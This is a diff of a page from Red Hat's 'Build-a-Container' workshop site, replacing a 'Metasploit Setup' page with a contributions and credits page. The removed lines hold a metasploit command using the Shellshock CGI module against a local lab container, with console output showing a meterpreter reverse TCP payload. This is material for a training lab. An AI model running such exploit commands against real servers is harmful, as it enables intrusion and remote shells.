@@ -3,8 +3,9 @@
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>Metasploit Setup :: BUILD-A-CONTAINER WORKSHOP</title>
-    <link rel="canonical" href="https://redhat-scholars.github.io/build-a-container/intro-container-workshop/1.0/metasploit_setup_standalone.html">
+    <title>Untitled :: BUILD-A-CONTAINER WORKSHOP</title>
+    <link rel="canonical" href="https://redhat-scholars.github.io/build-a-container/intro-container-workshop/1.0/contributions.html">
+    <link rel="prev" href="references.html">
     <meta name="generator" content="Antora 2.3.4">
     <link rel="stylesheet" href="../../_/css/site.css">
 <link rel="icon" href="../../_/img/favicon.ico" type="image/x-icon">
@@ -252,7 +253,7 @@
   <li class="nav-item" data-depth="1">
     <a class="nav-link" href="references.html"><em>References</em></a>
   </li>
-  <li class="nav-item" data-depth="1">
+  <li class="nav-item is-current-page" data-depth="1">
     <a class="nav-link" href="contributions.html"><em>Contributions</em></a>
   </li>
 </ul>
@@ -286,163 +287,33 @@
 <nav class="breadcrumbs" aria-label="breadcrumbs">
   <ul>
     <li><a href="index.html">BUILD-A-CONTAINER</a></li>
-    <li><a href="metasploit_setup_standalone.html">Metasploit Setup</a></li>
+    <li><a href="contributions.html"><em>Contributions</em></a></li>
   </ul>
 </nav>
-  <div class="edit-this-page"><a href="file:///Users/bfarr/projects/build-a-container/documentation/modules/ROOT/pages/metasploit_setup_standalone.adoc">Edit this Page</a></div>
+  <div class="edit-this-page"><a href="file:///Users/bfarr/projects/build-a-container/documentation/modules/ROOT/pages/contributions.adoc">Edit this Page</a></div>
 </div>
   <div class="content">
 <article class="doc">
-<h1 class="page">Metasploit Setup</h1>
+<div class="sect1 text-center strong">
+<h2 id="_contributions"><a class="anchor" href="#_contributions"></a>Contributions</h2>
+<div class="sectionbody">
 <div class="paragraph">
-<p>To create a metasploit terminal within your code-server instance, follow these instructions</p>
-</div>
-<div class="paragraph">
-<p>We are going to run metasploit as a non-root user in another terminal which we&#8217;ll refer to as <strong>Terminal 2</strong> in the tabs below.  If you haven&#8217;t already, you can split your terminal to open a new, non-root, shell</p>
-</div>
-<div class="imageblock">
-<div class="content">
-<img src="_images/terminal-split-annotated.jpg" alt="terminal split annotated">
-</div>
-<div class="title">Figure 1. Terminal Split button</div>
+<p>This workshop was built by a team who are really passionate about container technology and educating others.</p>
 </div>
 <div class="paragraph">
-<p>Then run the following commands in the newly created terminal:</p>
+<p>Credits for the workshop go to Benjamin Farr, Shane Boulden, Brian Stinehart, Ben Blasco, Alfred Lang, Marc Hildenbrand along with a number of colleagues who helped refine it.</p>
 </div>
-<div class="tabset is-loading">
-<div class="ulist tabs">
-<ul>
-<li>
-<p><a id="tabset1_terminal-2"></a>Terminal 2</p>
-</li>
-</ul>
-</div>
-<div class="content">
-<div class="tab-pane" aria-labelledby="tabset1_terminal-2">
-<div class="olist arabic">
-<ol class="arabic">
-<li>
-<p>Start up metasploit in your terminal by running the following command:</p>
-<div class="listingblock console-input">
-<div class="content">
-<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">msfconsole \
-    -x \<i class="conum" data-value="1"></i><b>(1)</b>
-"use multi/http/apache_mod_cgi_bash_env_exec; <i class="conum" data-value="2"></i><b>(2)</b>
-set RHOST 127.0.0.1; <i class="conum" data-value="3"></i><b>(3)</b>
-set RPORT 8081; <i class="conum" data-value="4"></i><b>(4)</b>
-set LHOST $(dig +short myip.opendns.com @resolver1.opendns.com); <i class="conum" data-value="5"></i><b>(5)</b>
-set targeturi /cgi-bin/log-visitor.sh" <i class="conum" data-value="6"></i><b>(6)</b></code></pre>
-</div>
-</div>
-<div class="colist arabic">
-<table>
-<tr>
-<td><i class="conum" data-value="1"></i><b>1</b></td>
-<td>The <code>-x</code> option allows us to pass commands directly into metasploit (see following explanations of each).  We use this to save setup time</td>
-</tr>
-<tr>
-<td><i class="conum" data-value="2"></i><b>2</b></td>
-<td>This is a metasploit module that plugs into the console.  There is a whole library of modules that are used with metasploit.  This one specifically targets the shellshock vulnerability via Apache&#8217;s cgi-bin support</td>
-</tr>
-<tr>
-<td><i class="conum" data-value="3"></i><b>3</b></td>
-<td>This is the address of the server (which we&#8217;re running locally in a container)</td>
-</tr>
-<tr>
-<td><i class="conum" data-value="4"></i><b>4</b></td>
-<td>The port the container is listening on (in our case the port that is forwarded to the container via the <code>-p</code> option to <code>podman run</code>)</td>
-</tr>
-<tr>
-<td><i class="conum" data-value="5"></i><b>5</b></td>
-<td>The public ip address of the VM instance (as reported by <code>dig</code>).  This is necessary for how metasploit works</td>
-</tr>
-<tr>
-<td><i class="conum" data-value="6"></i><b>6</b></td>
-<td>The target URL of a cgi-bin script.  Those that are astute might recognize this as the cgi-bin endpoint of the guestbook page (<code>hello.html</code>)</td>
-</tr>
-</table>
-</div>
-<div class="sidebarblock">
-<div class="content">
-<div class="title">NOTE</div>
+<div class="sect2">
+<h3 id="_contact"><a class="anchor" href="#_contact"></a>Contact</h3>
 <div class="paragraph">
-<p>If asked if you want to setup a new database, answer <strong>no</strong></p>
-</div>
-<div class="listingblock">
-<div class="content">
-<pre>Would you like to use and setup a new database (recommended)?</pre>
+<p>If you would like to get in contact you can connect with us on social media or email bfarr at Red Hat.</p>
 </div>
 </div>
 </div>
 </div>
-</li>
-<li>
-<p>When it&#8217;s done initializing, you should see output something like this (ASCII art, "tip", and <code>LHOST</code> will vary)</p>
-<div class="listingblock console-output">
-<div class="content">
-<pre class="highlightjs highlight"><code class="language-bash hljs" data-lang="bash">** Metasploit Framework Initial Setup Complete **
-
-[!] The following modules could not be loaded!../
-[!]     /opt/metasploit-framework/embedded/framework/modules/auxiliary/gather/office365userenum.py
-[!] Please see /home/student1/.msf4/logs/framework.log for details.
-
-                          ########                  #
-                      #################            #
-                   ######################         #
-                  #########################      #
-                ############################
-               ##############################
-               ###############################
-              ###############################
-              ##############################
-                              #    ########   #
-                 ##        ###        ####   ##
-                                      ###   ###
-                                    ####   ###
-               ####          ##########   ####
-               #######################   ####
-                 ####################   ####
-                  ##################  ####
-                    ############      ##
-                       ########        ###
-                      #########        #####
-                    ############      ######
-                   ########      #########
-                     #####       ########
-                       ###       #########
-                      ######    ############
-                     #######################
-                     #   #   ###  #   #   ##
-                     ########################
-                      ##     ##   ##     ##
-                            <a href="https://metasploit.com" class="bare">https://metasploit.com</a>
-
-
-       =[ metasploit v6.0.47-dev-                         ]
-+ -- --=[ 2135 exploits - 1138 auxiliary - 365 post       ]
-+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
-+ -- --=[ 8 evasion                                       ]
-
-Metasploit tip: When in a module, use back to go
-back to the top level prompt
-
-[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
-RHOST =&gt; 127.0.0.1
-RPORT =&gt; 8081
-LHOST =&gt; 54.79.241.48
-targeturi =&gt; /cgi-bin/log-visitor.sh
-msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt;</code></pre>
-</div>
-</div>
-</li>
-</ol>
-</div>
-</div>
-</div>
-</div>
-<div class="paragraph">
-<p>Now you can close this window and go back to the lab instructions.</p>
-</div>
+<nav class="pagination">
+  <span class="prev"><a href="references.html" class="query-params-link"><em>References</em></a></span>
+</nav>
 </article>
 <aside class="toc sidebar" data-title="Contents" data-levels="2">
   <div class="toc-menu"></div>
